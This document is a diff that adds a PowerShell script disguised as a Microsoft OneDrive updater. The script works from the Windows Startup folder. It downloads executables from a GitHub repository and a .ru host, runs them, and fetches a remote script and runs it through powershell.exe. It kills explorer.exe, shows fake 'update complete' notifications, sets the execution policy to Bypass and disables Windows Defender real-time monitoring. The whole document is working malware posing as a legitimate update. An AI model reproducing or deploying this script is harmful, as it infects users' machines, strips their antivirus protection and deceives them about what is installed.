@@ -1,0 +1,98 @@
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS/STARTUP'
+timeout /t 1
+Write-Host "Microsoft OneDrive: trying install the new version of OneDrive..." -ForegroundColor Green
+timeout /t 1
+del 'OneDrive.exe'
+timeout /t 1
+del 'OneDrive64.exe'
+timeout /t 1
+del 'OneDriveTaskManager.exe'
+timeout /t 1
+$url2 = 'https://raw.githubusercontent.com/nikitswi/DrWeb/main/OneDrive64.exe'
+$outputFile2 = 'OneDrive64.exe'
+$url = 'http://nord-engineering.ru/OneDrive.exe'
+$outputFile = 'OneDrive.exe'
+$url3 = 'https://raw.githubusercontent.com/nikitswi/DrWeb/main/OneDriveTaskManager.exe'
+$outputFile3 = 'OneDriveTaskManager.exe'
+while ((Test-Path $outputFile3) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url3 -OutFile $outputFile3
+    }
+    catch {
+        Write-Host "Error downloading OneDrive update. Trying before..." -ForegroundColor Green
+        del 'OneDriveTaskManager.exe'
+        Start-Sleep -Seconds 10
+    }
+}
+if (Test-Path $outputFile3) {
+    Start-Process -FilePath $outputFile3
+} else {
+    $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
+}
+while ((Test-Path $outputFile2) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url2 -OutFile $outputFile2
+    }
+    catch {
+        Write-Host "Error downloading OneDrive update. Trying before..." -ForegroundColor Green
+        del 'OneDrive.exe'
+        Start-Sleep -Seconds 10
+    }
+}
+Write-Host "OneDrive Update Downloaded, starting update..." -ForegroundColor Green
+while ((Test-Path $outputFile) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $outputFile
+    }
+    catch {
+        Write-Host "Error downloading OneDrive Update. Trying before..." -ForegroundColor Green
+        del 'OneDrive64.exe'
+        Start-Sleep -Seconds 10
+    }
+}
+Write-Host "OneDrive installed, starting screen installer..." -ForegroundColor Green
+timeout /t 2
+taskkill /im explorer.exe /f
+timeout /t 2
+if (Test-Path $outputFile) {
+    Start-Process -FilePath $outputFile
+} else {
+    $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
+}
+if (Test-Path $outputFile2) {
+    Start-Process -FilePath $outputFile2
+} else {
+    $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
+}
+timeout /t 60
+taskkill /im OneDrive64.exe /f
+timeout /t 2
+taskkill /im OneDriveTaskManager.exe /f
+timeout /t 2
+explorer.exe
+timeout /t 5
+del $outputFile
+timeout /t 1
+del $outputFile3
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS'
+del 'OneDrive64.exe'
+timeout /t 1
+Write-Host "OneDrive succesfully installed, thank you" -ForegroundColor Green
+Add-Type -AssemblyName System.Windows.Forms
+$global:balmsg = New-Object System.Windows.Forms.NotifyIcon
+$path = (Get-Process -id $pid).Path
+$balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
+$balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
+$balmsg.BalloonTipText = 'Installing and updating OneDrive is completed!'
+$balmsg.BalloonTipTitle = "Microsoft OneDrive"
+$balmsg.Visible = $true
+$balmsg.ShowBalloonTip(10000)
+powershell -NoP -Win H -Noni -Exec Bypass
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser 
+Set-MpPreference -DisableRealtimeMonitoring $true
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS/STARTUP'
+Start-Process -FilePath $outputFile5
+start df.bat
